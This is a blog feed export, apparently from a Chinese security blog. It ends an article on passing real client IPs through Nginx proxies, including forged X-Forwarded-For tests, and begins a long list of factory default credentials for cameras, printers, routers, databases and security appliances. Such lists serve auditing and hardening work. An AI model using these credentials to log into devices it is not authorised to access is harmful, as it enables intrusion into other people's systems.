&#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.99;</span><br><span class="line">           proxy_set_header    X-Forwarded-For $remote_addr;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2配置：<code>vim /opt/nginx/conf/nginx.conf</code>，只做代理转发。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.100;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="正常访问的日志情况-2"><a href="#正常访问的日志情况-2" class="headerlink" title="正常访问的日志情况"></a>正常访问的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问curl -XGET &quot;http://10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.99 - - [09/Dec/2019:09:37:39 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:37:39 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:09:37:39 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中XFF字段就代表用户的真实IP。</p><h2 id="伪造XFF的日志情况-2"><a href="#伪造XFF的日志情况-2" class="headerlink" title="伪造XFF的日志情况"></a>伪造XFF的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端访问时使用XFFcurl -XGET &quot;http://10.10.10.98&quot; -H &quot;X-Forwarded-For: 10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.99 - - [09/Dec/2019:09:41:53 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:41:53 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:09:41:53 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中XFF字段依旧代表客户端的真实IP，并且伪造的IP并没有传递到Nginx_Server中。</p><h2 id="使用代理的日志情况-1"><a href="#使用代理的日志情况-1" class="headerlink" title="使用代理的日志情况"></a>使用代理的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhiaTgfawBIniaMVeZiaqdDYZtDic8DI3oiaKsQK2E8CaeCMosSCmicQTITazQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问，我这里配置的是终端全局代理，所以不用单独指定代理参数curl -XGET &quot;http://47.x.x.156&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.178.77 - - [09/Dec/2019:15:07:45 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;43.x.x.74&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.x.x.74 - - [09/Dec/2019:15:07:44 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.178.76 - - [09/Dec/2019:15:07:44 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;43.x.x.74&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中XFF字段就是用户的代理IP，并且可以看到单独使用Nginx无法获取客户端的真实IP。</p><h1 id="使用X-Real-IP"><a href="#使用X-Real-IP" class="headerlink" title="使用X-Real-IP"></a>使用X-Real-IP</h1><h2 id="代理与服务器配置-3"><a href="#代理与服务器配置-3" class="headerlink" title="代理与服务器配置"></a>代理与服务器配置</h2><ul><li>Nginx_Server配置：<code>vim /opt/nginx/conf/nginx.conf</code>，将日志中的remote_addr替换为http_x_real_ip。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 注意日志配置的第一个字段，将remote_addr修改为http_x_real_ip</span><br><span class="line">log_format  main  &apos;$http_x_real_ip - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                    &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                    &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">  access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">  # ************* 省略了中间的配置</span><br><span class="line">  </span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  localhost;</span><br><span class="line"></span><br><span class="line">      #charset koi8-r;</span><br><span class="line"></span><br><span class="line">      #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">          root   html;</span><br><span class="line">          index  index.html index.htm;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1配置：<code>vim /opt/nginx/conf/nginx.conf</code>，设置代理与x-real-ip字段。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                    &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                    &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">  access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">  # ************* 省略了中间的配置</span><br><span class="line">  </span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  localhost;</span><br><span class="line"></span><br><span class="line">      #charset koi8-r;</span><br><span class="line"></span><br><span class="line">      #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">          #root   html;</span><br><span class="line">          #index  index.html index.htm;</span><br><span class="line">          # 注意这里的key value之间使用Tab</span><br><span class="line">          proxy_pass  http://10.10.10.99;</span><br><span class="line">          proxy_set_header    X-Real-IP       $remote_addr;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2配置：<code>vim /opt/nginx/conf/nginx.conf</code>，只做代理转发。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.100;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="正常访问的日志情况-3"><a href="#正常访问的日志情况-3" class="headerlink" title="正常访问的日志情况"></a>正常访问的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问curl -XGET &quot;http://10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:55:16 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:55:16 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:09:55:16 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中第一个字段就代表客户端的真实IP。</p><h2 id="伪造XFF的日志情况-3"><a href="#伪造XFF的日志情况-3" class="headerlink" title="伪造XFF的日志情况"></a>伪造XFF的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端访问时使用XFFcurl -XGET &quot;http://10.10.10.98&quot; -H &quot;X-Forwarded-For: 10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:10:00:38 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:10:00:38 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:10:00:38 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中第一个字段依旧代表客户端真实IP，伪造的IP在XFF字段中。</p><h2 id="使用代理的日志情况-2"><a href="#使用代理的日志情况-2" class="headerlink" title="使用代理的日志情况"></a>使用代理的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhiaTgfawBIniaMVeZiaqdDYZtDic8DI3oiaKsQK2E8CaeCMosSCmicQTITazQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问，我这里配置的是终端全局代理，所以不用单独指定代理参数curl -XGET &quot;http://47.x.x.156&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.x.x.74 - - [09/Dec/2019:15:16:05 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.x.x.74 - - [09/Dec/2019:15:16:05 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.178.76 - - [09/Dec/2019:15:16:05 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中第一个字段依旧代表客户端真实IP。</p><h1 id="云厂商如何获取客户端真实IP"><a href="#云厂商如何获取客户端真实IP" class="headerlink" title="云厂商如何获取客户端真实IP"></a>云厂商如何获取客户端真实IP</h1><ul><li>阿里云 如何获取客户端真实IP(<a href="https://help.aliyun.com/document_detail/54007.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/54007.html</a>)</li><li>使用知道创宇云安全后如何获取访客真实IP(<a href="http://help.yunaq.com/faq/67/index.html" target="_blank" rel="noopener">http://help.yunaq.com/faq/67/index.html</a>)</li></ul><h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>关于服务端获取客户端的真实IP可以实际场景实际分析吧！本文中提到的也只是一种很初级的网络架构。本文的适用范围相对也比较狭窄。</p><p>如果是复杂的网络结构，可以在每一层的产品上对对应厂商进行沟通：是否可以透传用户的真实IP，然后通过每一层的配置将真实IP传递到服务端使用合理的字段进行存储。</p><p>当然了安全本质就是不可信，传递的IP数据是否真实与客户端伪造技术、各层级之间相关配置都息息相关。IP维度也只是后端分析识别的一个维度而已，我们在尽可能保证这个维度的准确度时，不用太过钻牛角尖(除非是精准度要求非常高的场景)。对于中小型的企业，能结合IP、Location、Username、UA、Browser Banner、OS Banner等维度来做一些简单的关联分析即可。</p><p>以上就是小B做日志分析的前期调研第一篇，小B后续还会写一写关于日志分析的其他文章。(WeChat：Lzero2012)</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>Nginx多级反向代理下的IP透传(<a href="https://www.cnblogs.com/tea-melon/p/10977516.html" target="_blank" rel="noopener">https://www.cnblogs.com/tea-melon/p/10977516.html</a>)</li><li>Nginx之X-Forwarded-For中首个IP一定真实吗？(<a href="https://juejin.im/entry/5bbb6e90f265da0a89304a43" target="_blank" rel="noopener">https://juejin.im/entry/5bbb6e90f265da0a89304a43</a>)</li></ul><h1 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h1><p><a href="https://mp.weixin.qq.com/s/Z0d8G7S5swBcH-jLXvhKeg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z0d8G7S5swBcH-jLXvhKeg</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>默认口令集合</title>
      <link href="/2020/03/12/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E9%9B%86%E5%90%88/"/>
      <url>/2020/03/12/%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h3 id="视频监控设备："><a href="#视频监控设备：" class="headerlink" title="视频监控设备："></a><strong>视频监控设备：</strong></h3><ol><li>POLYCOM(视频会议<strong>系统</strong>) ：POLYCOM/POLYCOM</li><li>ACTi：admin/123456 或 Admin/123456</li><li>American Dynamics: admin/admin 或 admin/9999</li><li>Avigilon: admin/admin</li><li>radvision：Admin/1234</li><li>Aethra:Aethra/1234</li><li>DSS：system/123456</li><li>安迅士Axis: 以前 root/pass, 新安迅士摄像头在用户第一登录时要求创建密码 (但是 root/pass 可以允许ONVIF连接)</li><li>Basler: admin/admin</li><li>博士Bosch：密码空，初始登陆创建密码</li><li>金砖通讯Brickcom: admin/admin</li><li>佳能Canon: root/camera</li><li>科达：admin/admin</li><li>思科Cisco: 密码空，初始登陆创建密码</li><li>大华Dahua: admin/admin�0�2�0�2 admin/888888</li><li>Digital Watchdog: admin/admin</li><li>DRS: admin/1234</li><li>DVTel: Admin/1234</li><li>DynaColor: Admin/1234</li><li>FLIR: admin/fliradmin</li><li>FLIR (Dahua OEM): admin/admin</li><li>福斯康姆Foscam: admin/&lt;无密码&gt;</li><li>奇偶GeoVision: admin/admin</li><li>Grandstream: admin/admin</li><li>海康威视Hikvision: Previously admin/12345, 固件版本5.3.0以上要求创建密码</li><li>霍尼韦尔Honeywell: admin/1234</li><li>Intellio: admin/admin</li><li>IQinVision: root/system</li><li>IPX-DDK: root/admin 或 root/Admin</li><li>JVC: admin/jvc</li><li>March Networks: admin/&lt;无密码&gt;</li><li>Mobotix: admin/meinsm</li><li>Northern: 旧款摄像头 admin/12345, 新固件版本5.3.0以上需要用户创建新密码</li><li>松下Panasonic: 旧款摄像头 admin/12345, 但是固件版本2.40需要创建用户名和密码 username/password</li><li>派尔高Pelco Sarix: admin/admin</li><li>Pixord: admin/admin或or admin/4321</li><li>三星Samsung Techwin (old): admin/1111111</li><li>Samsung (new): 旧款摄像机 admin/4321, 新固件需要创建密码</li><li>三洋Sanyo: admin/admin</li><li>Scallop: admin/password</li><li>Sentry360 (mini): admin/1234�0�2�0�2 �0�2</li><li>索尼Sony: admin/admin | sonypcs/&lt;空&gt;</li><li>Speco: admin/1234</li><li>Stardot: admin/admin</li><li>海视云威Starvedia: admin/&lt;无密码&gt;</li><li>趋势网络Trendnet: admin/admin</li><li>东芝Toshiba: root/ikwd</li><li>VideoIQ: supervisor/supervisor</li><li>晶睿通讯Vivotek: root/&lt;无密码&gt;</li><li>联卫Unifore: admin/&lt;无密码&gt;</li><li>Ubiquiti: ubnt/ubnt</li><li>W-Box: admin/wbox123</li><li>Wodsee: admin/&lt;无密码&gt;�0�2�0�2 �0�2</li><li>机房监控<strong>系统</strong>：smt 123</li><li>DST:administrator/DST</li><li>SVR 网络存储录像机：admin/888888888888</li><li>infinova：admin/admin</li></ol><p>*<br>*</p><h3 id="打印机设备："><a href="#打印机设备：" class="headerlink" title="打印机设备："></a>打印机设备：</h3><ol><li>Generic：12345678</li><li>DocuCentre-V C2263(富士施乐打印机) ：11111/x-admin</li><li>东芝打印机Topaccess：admin/123456</li><li>C-lodop：admin/&lt;空&gt;</li><li>brother：admin/access</li><li>sharp夏普：admin/Sharp</li><li>sharp mx-2638nc telnet：superversion/&lt;空&gt;</li><li>Canon:7654321/7654321</li><li>DP-301U：admin/&lt;空&gt;</li><li>KONICA柯尼卡美能达：12345678</li><li>RICOH WEB IMAGE MONITOR打印机：admin/&lt;空&gt; | supervisor/&lt;空&gt;</li><li>三星syncthru web service：admin/sec00000</li></ol><p>*<br>*</p><h3 id="组件-服务-中间件："><a href="#组件-服务-中间件：" class="headerlink" title="组件/服务/中间件："></a><strong>组件/服务/中间件：</strong></h3><ol><li>北塔IT智能运维平台：admin/smartadmin</li><li>Fabric OS fabos telnet：admin password</li><li>迪普UMC统一管理中心：admin/Administrator</li><li>Geoserver：admin/geoserver</li><li>phpmyadmin：root/root</li><li>中控智能锁设备web3.0：administrator/123456</li></ol><p>*<br>*</p><h3 id="网络设备："><a href="#网络设备：" class="headerlink" title="网络设备："></a><strong>网络设备：</strong></h3><ol><li>华为：<br>admin admin123<br>Root�0�2 admin@123<br>�0�2 �0�2 �0�2�0�2 �0�2 Huawei12$#<br>�0�2 �0�2�0�2 �0�2�0�2�0�2 huawei12#$<br>�0�2 �0�2 �0�2 �0�2�0�2 Huawei@123</li><li>IAD2000 telnet：root/admin</li><li>绿盟：Nsfocus_00</li><li>中兴网关：root/root</li><li>SICOM6424SM Web管理<strong>系统</strong>：admin/123</li><li>H3C 路由器：admin/admin</li><li>M2M server：admin/admin</li><li>迈普路由器RM1800-35E-AC：admin/admin</li><li>SonicWALL 防火墙中文手册PDF版本用户名：admin:password</li><li>ThinkServer management module：lenovo/len0vO</li></ol><p>**<br>eSpace：</p><ol><li>IAD WEB：root/huawei123</li><li>eSight Web：admin/Huawei@123</li><li>RH2285：root/Huawei12#$</li><li>E6000：root/Huawei12#$</li><li>CSMT：admin/Admin@123</li><li>VCS：admin/admin1234</li><li>统一网关:UAP3300：admin/huawei123 | UAP3300：无/huawei123 | U2980/U2990：(admin | administrator)/eSpaceU2900 | u2980 OMU单板：root/mtcaPass</li><li>CTI平台 <strong>系统</strong>管理员：1/cti-1234</li><li>WAS<strong>系统</strong>:admin/cti-1234</li><li>DataStation：admin/admin123Q!</li><li>Agent Management：sysadmin/Huawei@123</li><li>eSpace POM：admin/Huawei@123</li><li>eSight �0�2�0�2 �0�2admin/Changeme123</li><li>MainAst：admin/cti-1234</li><li>iDeploy：admin/Admin123</li><li>eSpace BIR �0�2�0�2 �0�2admin/Password@123</li><li>文件服务器：root/Huawei@123 | administrator/Huawei@123</li><li>oracle：root/Huawei@123</li><li>sql server 2008:<br><strong>系统</strong>管理员和SQL Server服务器安装用户：user/Huawei@123<br>数据库管理员：sa/123456Rq<br>UIDB数据库用户：Ipcc1234<br>WAS数据库用户：was/Ipcc1234<br>Agent数据库用户：GAEA/Ipcc1234</li></ol><p>*<br>*</p><h3 id="数据库："><a href="#数据库：" class="headerlink" title="数据库："></a><strong>数据库：</strong></h3><ol><li>mysql:root/root</li><li>mmsql:sa/&lt;空&gt;</li><li>PostgreSql:postgres/123456</li><li>Orcale:system/manager | sys/manager</li></ol><p>*<br>*</p><h3 id="安全产品设备："><a href="#安全产品设备：" class="headerlink" title="安全产品设备："></a>安全产品设备：</h3><ol><li>深信服产品：sangfor/（sangfor | sangfor@2018| sangfor@2019）</li><li>深信服科技AD：密码dlanrecover</li><li>深信服负载均衡 AD 3.6：admin/admin</li><li>深信服WAC ( WNS V2.6)：admin/admin</li><li>深信服v-p-n：Admin/Admin</li><li>深信服ipsec-V-P-N (SSL 5.5)：Admin/Admin</li><li>深信服AC6.0：admin/admin</li><li>SANGFOR防火墙：admin/sangfor</li><li>深信服AF(NGAF V2.2)：admin/sangfor</li><li>深信服NGAF下一代应用防火墙(NGAF V4.3)：admin/admin</li><li>深信服AD3.9：admin/admin</li><li>深信服上网行为管理设备数据中心：Admin/密码为空</li><li>SANGFOR_AD_v5.1：admin/admin</li><li>网御漏洞扫描<strong>系统</strong>：leadsec/leadsec</li><li>天阗入侵检测与管理<strong>系统</strong> V7.0：Admin/venus70 | Audit/venus70 | adm/venus70</li><li>天阗入侵检测与管理<strong>系统</strong> V6.0：Admin/venus60 | Audit/venus60 | adm/venus60</li><li>网御WAF集中控制中心(V3.0R5.0)：admin/leadsec.waf | audit/leadsec.waf | adm/leadsec.waf �0�2�0�2 